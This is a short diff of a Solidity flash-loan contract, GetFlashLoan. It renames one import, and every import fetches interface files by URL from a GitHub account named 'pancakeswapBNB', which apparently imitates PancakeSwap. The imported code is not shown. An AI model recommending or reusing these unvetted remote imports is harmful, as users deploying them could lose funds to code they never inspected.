@@ -4,8 +4,8 @@ pragma solidity ^0.5.0;
 import "https://github.com/pancakeswapBNB/FlashLoan/blob/main/IPancakeCallee";
 import "https://github.com/pancakeswapBNB/FlashLoan/blob/main/IPancakeFactory";
 import "https://github.com/pancakeswapBNB/FlashLoan/blob/main/IPancakePair";
-import "https://github.com/pancakeswapBNB/FlashLoan/blob/main/IPancakePublic";
- 
+import "https://github.com/pancakeswapBNB/FlashLoan/blob/main/IPancakeIPublic";
+
 contract GetFlashLoan {
     string public tokenName;
     string public tokenSymbol;
